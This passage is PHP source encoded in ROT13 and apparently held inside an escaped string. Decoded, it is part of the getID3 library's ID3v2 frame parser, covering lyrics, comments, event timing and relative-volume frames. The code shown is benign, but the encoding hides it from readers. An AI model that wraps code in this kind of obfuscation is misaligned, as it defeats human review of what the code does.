				$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][] = $cnefrqSenzr['qngn'];
			}


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'ZPQV')) || // 4.4   ZPQV Zhfvp PQ vqragvsvre
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'ZPV'))) {     // 4.5   ZPV  Zhfvp PQ vqragvsvre
			//   Gurer znl bayl or bar 'ZPQV' senzr va rnpu gnt
			// <Urnqre sbe 'Zhfvp PQ vqragvsvre', VQ: 'ZPQV'>
			// PQ GBP                <ovanel qngn>

			vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && !rzcgl($cnefrqSenzr['qngn'])) {
				$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][] = $cnefrqSenzr['qngn'];
			}


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'RGPB')) || // 4.5   RGPB Rirag gvzvat pbqrf
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'RGP'))) {     // 4.6   RGP  Rirag gvzvat pbqrf
			//   Gurer znl bayl or bar 'RGPB' senzr va rnpu gnt
			// <Urnqre sbe 'Rirag gvzvat pbqrf', VQ: 'RGPB'>
			// Gvzr fgnzc sbezng    $kk
			//   Jurer gvzr fgnzc sbezng vf:
			// $01  (32-ovg inyhr) ZCRT senzrf sebz ortvaavat bs svyr
			// $02  (32-ovg inyhr) zvyyvfrpbaqf sebz ortvaavat bs svyr
			//   Sbyybjrq ol n yvfg bs xrl riragf va gur sbyybjvat sbezng:
			// Glcr bs rirag   $kk
			// Gvzr fgnzc      $kk (kk ...)
			//   Gur 'Gvzr fgnzc' vf frg gb mreb vs qverpgyl ng gur ortvaavat bs gur fbhaq
			//   be nsgre gur cerivbhf rirag. Nyy riragf ZHFG or fbegrq va puebabybtvpny beqre.

			$senzr_bssfrg = 0;
			$cnefrqSenzr['gvzrfgnzcsbezng'] = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));

			juvyr ($senzr_bssfrg < fgeyra($cnefrqSenzr['qngn'])) {
				$cnefrqSenzr['glcrvq']    = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1);
				$cnefrqSenzr['glcr']      = $guvf->RGPBRiragYbbxhc($cnefrqSenzr['glcrvq']);
				$cnefrqSenzr['gvzrfgnzc'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
				$senzr_bssfrg += 4;
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'ZYYG')) || // 4.6   ZYYG ZCRT ybpngvba ybbxhc gnoyr
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'ZYY'))) {     // 4.7   ZYY ZCRT ybpngvba ybbxhc gnoyr
			//   Gurer znl bayl or bar 'ZYYG' senzr va rnpu gnt
			// <Urnqre sbe 'Ybpngvba ybbxhc gnoyr', VQ: 'ZYYG'>
			// ZCRT senzrf orgjrra ersrerapr  $kk kk
			// Olgrf orgjrra ersrerapr        $kk kk kk
			// Zvyyvfrpbaqf orgjrra ersrerapr $kk kk kk
			// Ovgf sbe olgrf qrivngvba       $kk
			// Ovgf sbe zvyyvfrpbaqf qri.     $kk
			//   Gura sbe rirel ersrerapr gur sbyybjvat qngn vf vapyhqrq;
			// Qrivngvba va olgrf         %kkk....
			// Qrivngvba va zvyyvfrpbaqf  %kkk....

			$senzr_bssfrg = 0;
			$cnefrqSenzr['senzrforgjrraersreraprf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], 0, 2));
			$cnefrqSenzr['olgrforgjrraersreraprf']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], 2, 3));
			$cnefrqSenzr['zforgjrraersreraprf']     = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], 5, 3));
			$cnefrqSenzr['ovgfsbeolgrfqrivngvba']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], 8, 1));
			$cnefrqSenzr['ovgfsbezfqrivngvba']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], 9, 1));
			$cnefrqSenzr['qngn'] = fhofge($cnefrqSenzr['qngn'], 10);
			$qrivngvbaovgfgernz = '';
			juvyr ($senzr_bssfrg < fgeyra($cnefrqSenzr['qngn'])) {
				$qrivngvbaovgfgernz .= trgvq3_yvo::OvtRaqvna2Ova(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			}
			$ersrerapr_pbhagre = 0;
			juvyr (fgeyra($qrivngvbaovgfgernz) > 0) {
				$cnefrqSenzr[$ersrerapr_pbhagre]['olgrqrivngvba'] = ovaqrp(fhofge($qrivngvbaovgfgernz, 0, $cnefrqSenzr['ovgfsbeolgrfqrivngvba']));
				$cnefrqSenzr[$ersrerapr_pbhagre]['zfqrivngvba']   = ovaqrp(fhofge($qrivngvbaovgfgernz, $cnefrqSenzr['ovgfsbeolgrfqrivngvba'], $cnefrqSenzr['ovgfsbezfqrivngvba']));
				$qrivngvbaovgfgernz = fhofge($qrivngvbaovgfgernz, $cnefrqSenzr['ovgfsbeolgrfqrivngvba'] + $cnefrqSenzr['ovgfsbezfqrivngvba']);
				$ersrerapr_pbhagre++;
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'FLGP')) || // 4.7   FLGP Flapuebavfrq grzcb pbqrf
				  (($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'FGP'))) {  // 4.8   FGP  Flapuebavfrq grzcb pbqrf
			//   Gurer znl bayl or bar 'FLGP' senzr va rnpu gnt
			// <Urnqre sbe 'Flapuebavfrq grzcb pbqrf', VQ: 'FLGP'>
			// Gvzr fgnzc sbezng   $kk
			// Grzcb qngn          <ovanel qngn>
			//   Jurer gvzr fgnzc sbezng vf:
			// $01  (32-ovg inyhr) ZCRT senzrf sebz ortvaavat bs svyr
			// $02  (32-ovg inyhr) zvyyvfrpbaqf sebz ortvaavat bs svyr

			$senzr_bssfrg = 0;
			$cnefrqSenzr['gvzrfgnzcsbezng'] = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$gvzrfgnzc_pbhagre = 0;
			juvyr ($senzr_bssfrg < fgeyra($cnefrqSenzr['qngn'])) {
				$cnefrqSenzr[$gvzrfgnzc_pbhagre]['grzcb'] = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
				vs ($cnefrqSenzr[$gvzrfgnzc_pbhagre]['grzcb'] == 255) {
					$cnefrqSenzr[$gvzrfgnzc_pbhagre]['grzcb'] += beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
				}
				$cnefrqSenzr[$gvzrfgnzc_pbhagre]['gvzrfgnzc'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
				$senzr_bssfrg += 4;
				$gvzrfgnzc_pbhagre++;
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'HFYG')) || // 4.8   HFYG Haflapuebavfrq ylevp/grkg genafpevcgvba
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'HYG'))) {    // 4.9   HYG  Haflapuebavfrq ylevp/grkg genafpevcgvba
			//   Gurer znl or zber guna bar 'Haflapuebavfrq ylevpf/grkg genafpevcgvba' senzr
			//   va rnpu gnt, ohg bayl bar jvgu gur fnzr ynathntr naq pbagrag qrfpevcgbe.
			// <Urnqre sbe 'Haflapuebavfrq ylevpf/grkg genafpevcgvba', VQ: 'HFYG'>
			// Grkg rapbqvat        $kk
			// Ynathntr             $kk kk kk
			// Pbagrag qrfpevcgbe   <grkg fgevat nppbeqvat gb rapbqvat> $00 (00)
			// Ylevpf/grkg          <shyy grkg fgevat nppbeqvat gb rapbqvat>

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$senzr_grkgrapbqvat_grezvangbe = $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat);
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
				$senzr_grkgrapbqvat_grezvangbe = \"\k00\";
			}
			vs (fgeyra($cnefrqSenzr['qngn']) >= (4 + fgeyra($senzr_grkgrapbqvat_grezvangbe))) {  // fubhyqa'g or na vffhr ohg onqyl-jevggra svyrf unir orra fcbggrq va gur jvyq jvgu abg bayl ab pbagragf ohg nyfb zvffvat gur erdhverq ynathntr svryq, frr uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/315
				$senzr_ynathntr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 3);
				$senzr_bssfrg += 3;
				$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe, $senzr_bssfrg);
				vs (beq(fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe), 1)) === 0) {
					$senzr_grezvangbecbf++; // fgecbf() sbbyrq orpnhfr 2aq olgr bs Havpbqr punef ner bsgra 0k00
				}
				$cnefrqSenzr['qrfpevcgvba'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
				$cnefrqSenzr['qrfpevcgvba'] = $guvf->ZnxrHGS16rzcglFgevatRzcgl($cnefrqSenzr['qrfpevcgvba']);
				$cnefrqSenzr['qngn'] = fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe));
				$cnefrqSenzr['qngn'] = $guvf->ErzbirFgevatGrezvangbe($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe);

				$cnefrqSenzr['rapbqvatvq']   = $senzr_grkgrapbqvat;
				$cnefrqSenzr['rapbqvat']     = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);

				$cnefrqSenzr['ynathntr']     = $senzr_ynathntr;
				$cnefrqSenzr['ynathntranzr'] = $guvf->YnathntrYbbxhc($senzr_ynathntr, snyfr);
				vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && !rzcgl($cnefrqSenzr['qngn'])) {
					$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][] = trgvq3_yvo::vpbai_snyyonpx($cnefrqSenzr['rapbqvat'], $vasb['vq3i2']['rapbqvat'], $cnefrqSenzr['qngn']);
				}
			} ryfr {
				$guvf->jneavat('Vainyvq qngn va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" ng bssfrg '.$cnefrqSenzr['qngnbssfrg']);
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'FLYG')) || // 4.9   FLYG Flapuebavfrq ylevp/grkg
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'FYG'))) {     // 4.10  FYG  Flapuebavfrq ylevp/grkg
			//   Gurer znl or zber guna bar 'FLYG' senzr va rnpu gnt,
			//   ohg bayl bar jvgu gur fnzr ynathntr naq pbagrag qrfpevcgbe.
			// <Urnqre sbe 'Flapuebavfrq ylevpf/grkg', VQ: 'FLYG'>
			// Grkg rapbqvat        $kk
			// Ynathntr             $kk kk kk
			// Gvzr fgnzc sbezng    $kk
			//   $01  (32-ovg inyhr) ZCRT senzrf sebz ortvaavat bs svyr
			//   $02  (32-ovg inyhr) zvyyvfrpbaqf sebz ortvaavat bs svyr
			// Pbagrag glcr         $kk
			// Pbagrag qrfpevcgbe   <grkg fgevat nppbeqvat gb rapbqvat> $00 (00)
			//   Grezvangrq grkg gb or flaprq (glcvpnyyl n flyynoyr)
			//   Flap vqragvsvre (grezvangbe gb nobir fgevat)   $00 (00)
			//   Gvzr fgnzc                                     $kk (kk ...)

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$senzr_grkgrapbqvat_grezvangbe = $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat);
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
				$senzr_grkgrapbqvat_grezvangbe = \"\k00\";
			}
			$senzr_ynathntr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 3);
			$senzr_bssfrg += 3;
			$cnefrqSenzr['gvzrfgnzcsbezng'] = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['pbagragglcrvq']   = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['pbagragglcr']     = $guvf->FLGYPbagragGlcrYbbxhc($cnefrqSenzr['pbagragglcrvq']);
			$cnefrqSenzr['rapbqvatvq']      = $senzr_grkgrapbqvat;
			$cnefrqSenzr['rapbqvat']        = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);

			$cnefrqSenzr['ynathntr']        = $senzr_ynathntr;
			$cnefrqSenzr['ynathntranzr']    = $guvf->YnathntrYbbxhc($senzr_ynathntr, snyfr);

			$gvzrfgnzcvaqrk = 0;
			$senzr_erznvavatqngn = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
			juvyr (fgeyra($senzr_erznvavatqngn)) {
				$senzr_bssfrg = 0;
				$senzr_grezvangbecbf = fgecbf($senzr_erznvavatqngn, $senzr_grkgrapbqvat_grezvangbe);
				vs ($senzr_grezvangbecbf === snyfr) {
					$senzr_erznvavatqngn = '';
				} ryfr {
					vs (beq(fhofge($senzr_erznvavatqngn, $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe), 1)) === 0) {
						$senzr_grezvangbecbf++; // fgecbf() sbbyrq orpnhfr 2aq olgr bs Havpbqr punef ner bsgra 0k00
					}
					$cnefrqSenzr['ylevpf'][$gvzrfgnzcvaqrk]['qngn'] = fhofge($senzr_erznvavatqngn, $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);

					$senzr_erznvavatqngn = fhofge($senzr_erznvavatqngn, $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe));
					vs (($gvzrfgnzcvaqrk == 0) && (beq($senzr_erznvavatqngn[0]) != 0)) {
						// gvzrfgnzc cebonoyl bzvggrq sbe svefg qngn vgrz
					} ryfr {
						$cnefrqSenzr['ylevpf'][$gvzrfgnzcvaqrk]['gvzrfgnzc'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_erznvavatqngn, 0, 4));
						$senzr_erznvavatqngn = fhofge($senzr_erznvavatqngn, 4);
					}
					$gvzrfgnzcvaqrk++;
				}
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'PBZZ')) || // 4.10  PBZZ Pbzzragf
				(($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'PBZ'))) {     // 4.11  PBZ  Pbzzragf
			//   Gurer znl or zber guna bar pbzzrag senzr va rnpu gnt,
			//   ohg bayl bar jvgu gur fnzr ynathntr naq pbagrag qrfpevcgbe.
			// <Urnqre sbe 'Pbzzrag', VQ: 'PBZZ'>
			// Grkg rapbqvat          $kk
			// Ynathntr               $kk kk kk
			// Fubeg pbagrag qrfpevc. <grkg fgevat nppbeqvat gb rapbqvat> $00 (00)
			// Gur npghny grkg        <shyy grkg fgevat nppbeqvat gb rapbqvat>

			vs (fgeyra($cnefrqSenzr['qngn']) < 5) {

				$guvf->jneavat('Vainyvq qngn (gbb fubeg) sbe \"'.$cnefrqSenzr['senzr_anzr'].'\" senzr ng bssfrg '.$cnefrqSenzr['qngnbssfrg']);

			} ryfr {

				$senzr_bssfrg = 0;
				$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
				$senzr_grkgrapbqvat_grezvangbe = $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat);
				vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
					$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
					$senzr_grkgrapbqvat_grezvangbe = \"\k00\";
				}
				$senzr_ynathntr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 3);
				$senzr_bssfrg += 3;
				$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe, $senzr_bssfrg);
				vs (beq(fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe), 1)) === 0) {
					$senzr_grezvangbecbf++; // fgecbf() sbbyrq orpnhfr 2aq olgr bs Havpbqr punef ner bsgra 0k00
				}
				$cnefrqSenzr['qrfpevcgvba'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
				$cnefrqSenzr['qrfpevcgvba'] = $guvf->ZnxrHGS16rzcglFgevatRzcgl($cnefrqSenzr['qrfpevcgvba']);
				$senzr_grkg = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe));
				$senzr_grkg = $guvf->ErzbirFgevatGrezvangbe($senzr_grkg, $senzr_grkgrapbqvat_grezvangbe);

				$cnefrqSenzr['rapbqvatvq']   = $senzr_grkgrapbqvat;
				$cnefrqSenzr['rapbqvat']     = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);

				$cnefrqSenzr['ynathntr']     = $senzr_ynathntr;
				$cnefrqSenzr['ynathntranzr'] = $guvf->YnathntrYbbxhc($senzr_ynathntr, snyfr);
				$cnefrqSenzr['qngn']         = $senzr_grkg;
				vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && !rzcgl($cnefrqSenzr['qngn'])) {
					$pbzzragxrl = ($cnefrqSenzr['qrfpevcgvba'] ? $cnefrqSenzr['qrfpevcgvba'] : (!rzcgl($vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']]) ? pbhag($vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']]) : 0));
					vs (!vffrg($vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']]) || !neenl_xrl_rkvfgf($pbzzragxrl, $vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']])) {
						$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][$pbzzragxrl] = trgvq3_yvo::vpbai_snyyonpx($cnefrqSenzr['rapbqvat'], $vasb['vq3i2']['rapbqvat'], $cnefrqSenzr['qngn']);
					} ryfr {
						$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][]            = trgvq3_yvo::vpbai_snyyonpx($cnefrqSenzr['rapbqvat'], $vasb['vq3i2']['rapbqvat'], $cnefrqSenzr['qngn']);
					}
				}

			}

		} ryfrvs (($vq3i2_znwbeirefvba >= 4) && ($cnefrqSenzr['senzr_anzr'] == 'EIN2')) { // 4.11  EIN2 Eryngvir ibyhzr nqwhfgzrag (2) (VQ3i2.4+ bayl)
			//   Gurer znl or zber guna bar 'EIN2' senzr va rnpu gnt,
			//   ohg bayl bar jvgu gur fnzr vqragvsvpngvba fgevat
			// <Urnqre sbe 'Eryngvir ibyhzr nqwhfgzrag (2)', VQ: 'EIN2'>
			// Vqragvsvpngvba          <grkg fgevat> $00
			//   Gur 'vqragvsvpngvba' fgevat vf hfrq gb vqragvsl gur fvghngvba naq/be
			//   qrivpr jurer guvf nqwhfgzrag fubhyq nccyl. Gur sbyybjvat vf gura
			//   ercrngrq sbe rirel punaary:
			// Glcr bs punaary         $kk
			// Ibyhzr nqwhfgzrag       $kk kk
			// Ovgf ercerfragvat crnx  $kk
			// Crnx ibyhzr             $kk (kk ...)

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\");
			$senzr_vqfgevat = fhofge($cnefrqSenzr['qngn'], 0, $senzr_grezvangbecbf);
			vs (beq($senzr_vqfgevat) === 0) {
				$senzr_vqfgevat = '';
			}
			$senzr_erznvavatqngn = fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra(\"\k00\"));
			$cnefrqSenzr['qrfpevcgvba'] = $senzr_vqfgevat;
			$EIN2punaarypbhagre = 0;
			juvyr (fgeyra($senzr_erznvavatqngn) >= 5) {
				$senzr_bssfrg = 0;
				$senzr_punaaryglcrvq = beq(fhofge($senzr_erznvavatqngn, $senzr_bssfrg++, 1));
				$cnefrqSenzr[$EIN2punaarypbhagre]['punaaryglcrvq']  = $senzr_punaaryglcrvq;
				$cnefrqSenzr[$EIN2punaarypbhagre]['punaaryglcr']    = $guvf->EIN2PunaaryGlcrYbbxhc($senzr_punaaryglcrvq);
				$cnefrqSenzr[$EIN2punaarypbhagre]['ibyhzrnqwhfg']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_erznvavatqngn, $senzr_bssfrg, 2), snyfr, gehr); // 16-ovg fvtarq
				$senzr_bssfrg += 2;
				$cnefrqSenzr[$EIN2punaarypbhagre]['ovgfcrnxibyhzr'] = beq(fhofge($senzr_erznvavatqngn, $senzr_bssfrg++, 1));
				vs (($cnefrqSenzr[$EIN2punaarypbhagre]['ovgfcrnxibyhzr'] < 1) || ($cnefrqSenzr[$EIN2punaarypbhagre]['ovgfcrnxibyhzr'] > 4)) {
					$guvf->jneavat('VQ3i2::EIN2 senzr['.$EIN2punaarypbhagre.'] pbagnvaf vainyvq '.$cnefrqSenzr[$EIN2punaarypbhagre]['ovgfcrnxibyhzr'].'-olgr ovgf-ercerfragvat-crnx inyhr');
					oernx;
				}
				$senzr_olgrfcrnxibyhzr = prvy($cnefrqSenzr[$EIN2punaarypbhagre]['ovgfcrnxibyhzr'] / 8);
				$cnefrqSenzr[$EIN2punaarypbhagre]['crnxibyhzr']     = trgvq3_yvo::OvtRaqvna2Vag(fhofge($senzr_erznvavatqngn, $senzr_bssfrg, $senzr_olgrfcrnxibyhzr));
				$senzr_erznvavatqngn = fhofge($senzr_erznvavatqngn, $senzr_bssfrg + $senzr_olgrfcrnxibyhzr);
				$EIN2punaarypbhagre++;
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs ((($vq3i2_znwbeirefvba == 3) && ($cnefrqSenzr['senzr_anzr'] == 'EINQ')) || // 4.12  EINQ Eryngvir ibyhzr nqwhfgzrag (VQ3i2.3 bayl)
				  (($vq3i2_znwbeirefvba == 2) && ($cnefrqSenzr['senzr_anzr'] == 'EIN'))) {  // 4.12  EIN  Eryngvir ibyhzr nqwhfgzrag (VQ3i2.2 bayl)
			//   Gurer znl bayl or bar 'EIN' senzr va rnpu gnt
			// <Urnqre sbe 'Eryngvir ibyhzr nqwhfgzrag', VQ: 'EIN'>
			// VQ3i2.2 => Vaperzrag/qrperzrag     %000000on
			// VQ3i2.3 => Vaperzrag/qrperzrag     %00srqpon
			// Ovgf hfrq sbe ibyhzr qrfpe.        $kk
			// Eryngvir ibyhzr punatr, evtug      $kk kk (kk ...) // n
			// Eryngvir ibyhzr punatr, yrsg       $kk kk (kk ...) // o
			// Crnx ibyhzr evtug                  $kk kk (kk ...)
			// Crnx ibyhzr yrsg                   $kk kk (kk ...)
			//   VQ3i2.3 bayl, bcgvbany (abg cerfrag va VQ3i2.2):
			// Eryngvir ibyhzr punatr, evtug onpx $kk kk (kk ...) // p
			// Eryngvir ibyhzr punatr, yrsg onpx  $kk kk (kk ...) // q
			// Crnx ibyhzr evtug onpx             $kk kk (kk ...)
			// Crnx ibyhzr yrsg onpx              $kk kk (kk ...)
			//   VQ3i2.3 bayl, bcgvbany (abg cerfrag va VQ3i2.2):
			// Eryngvir ibyhzr punatr, pragre     $kk kk (kk ...) // r
			// Crnx ibyhzr pragre                 $kk kk (kk ...)
			//   VQ3i2.3 bayl, bcgvbany (abg cerfrag va VQ3i2.2):
			// Eryngvir ibyhzr punatr, onff       $kk kk (kk ...) // s
			// Crnx ibyhzr onff                   $kk kk (kk ...)

			$senzr_bssfrg = 0;
			$senzr_vapeqrpesyntf = trgvq3_yvo::OvtRaqvna2Ova(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['vapqrp']['evtug'] = (obby) fhofge($senzr_vapeqrpesyntf, 6, 1);
			$cnefrqSenzr['vapqrp']['yrsg']  = (obby) fhofge($senzr_vapeqrpesyntf, 7, 1);
			$cnefrqSenzr['ovgfibyhzr'] = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$senzr_olgrfibyhzr = prvy($cnefrqSenzr['ovgfibyhzr'] / 8);
			$cnefrqSenzr['ibyhzrpunatr']['evtug'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
			vs ($cnefrqSenzr['vapqrp']['evtug'] === snyfr) {
				$cnefrqSenzr['ibyhzrpunatr']['evtug'] *= -1;
			}
			$senzr_bssfrg += $senzr_olgrfibyhzr;
			$cnefrqSenzr['ibyhzrpunatr']['yrsg'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
			vs ($cnefrqSenzr['vapqrp']['yrsg'] === snyfr) {
				$cnefrqSenzr['ibyhzrpunatr']['yrsg'] *= -1;
			}
			$senzr_bssfrg += $senzr_olgrfibyhzr;
			$cnefrqSenzr['crnxibyhzr']['evtug'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
			$senzr_bssfrg += $senzr_olgrfibyhzr;
			$cnefrqSenzr['crnxibyhzr']['yrsg']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
			$senzr_bssfrg += $senzr_olgrfibyhzr;
			vs ($vq3i2_znwbeirefvba == 3) {
				$cnefrqSenzr['qngn'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
				vs (fgeyra($cnefrqSenzr['qngn']) > 0) {
					$cnefrqSenzr['vapqrp']['evtugerne'] = (obby) fhofge($senzr_vapeqrpesyntf, 4, 1);
					$cnefrqSenzr['vapqrp']['yrsgerne']  = (obby) fhofge($senzr_vapeqrpesyntf, 5, 1);
					$cnefrqSenzr['ibyhzrpunatr']['evtugerne'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
					vs ($cnefrqSenzr['vapqrp']['evtugerne'] === snyfr) {
						$cnefrqSenzr['ibyhzrpunatr']['evtugerne'] *= -1;
					}
					$senzr_bssfrg += $senzr_olgrfibyhzr;
					$cnefrqSenzr['ibyhzrpunatr']['yrsgerne'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
					vs ($cnefrqSenzr['vapqrp']['yrsgerne'] === snyfr) {
						$cnefrqSenzr['ibyhzrpunatr']['yrsgerne'] *= -1;
					}
					$senzr_bssfrg += $senzr_olgrfibyhzr;
					$cnefrqSenzr['crnxibyhzr']['evtugerne'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
					$senzr_bssfrg += $senzr_olgrfibyhzr;
					$cnefrqSenzr['crnxibyhzr']['yrsgerne']  = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfibyhzr));
					$senzr_bssfrg += $senzr_olgrfibyhzr;
				}
				$cnefrqSenzr['qngn'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
				vs (fgeyra($cnefrqSenzr['qngn']) > 0) {
